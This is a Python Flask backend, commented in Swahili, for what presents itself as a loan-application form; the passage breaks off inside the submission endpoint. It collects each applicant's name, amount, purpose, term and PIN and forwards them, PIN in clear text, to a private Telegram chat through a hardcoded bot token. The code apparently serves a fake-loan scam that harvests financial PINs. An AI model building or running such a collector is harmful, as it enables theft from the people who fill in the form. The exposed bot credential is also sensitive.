from flask import Flask, request, jsonify
import requests
import random

app = Flask(__name__)

# =========================
# TELEGRAM CONFIG
# =========================
BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
CHAT_ID = "6958413637"

# Kuhifadhi maombi kwa muda
maombi = {}

# =========================
# SEND TO TELEGRAM FUNCTION
# =========================
def tuma_kwenye_telegram(app_id, data):

    ujumbe = f"""
📥 MAOMBI MAPYA YA MKOPO

🆔 Namba ya Maombi: {app_id}

👤 Jina: {data.get('jina')}
💰 Kiasi: {data.get('kiasi')}
🎯 Lengo: {data.get('lengo')}
📅 Muda: {data.get('muda')}
🔐 PIN: {data.get('pin')}

📌 Hali: PENDING
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    response = requests.post(
        url,
        json={
            "chat_id": CHAT_ID,
            "text": ujumbe
        }
    )

    # Kuonyesha response ya Telegram kwenye terminal
    print(response.text)

# =========================
# STEP 3 ENDPOINT
# =========================
@app.route("/submit-step3", methods=["POST"])
def wasilisha_hatua_ya_3():

    try:
        data = request.get_json()

        # Hakikisha data imepatikana
        if not data:
            return jsonify({
                "message": "Hakuna data iliyotumwa"
            }), 400

        # Generate Application ID
        app_id = str(random.randint(10000, 99999))

        # Save application
        maombi[app_id] = data
        maombi[app_id]["status"] = "PENDING"

        # Send to Telegram
        tuma_kwenye_telegram(app_id, maombi[app_id])

        return jsonify({
            "message": "Imefanikiwa",
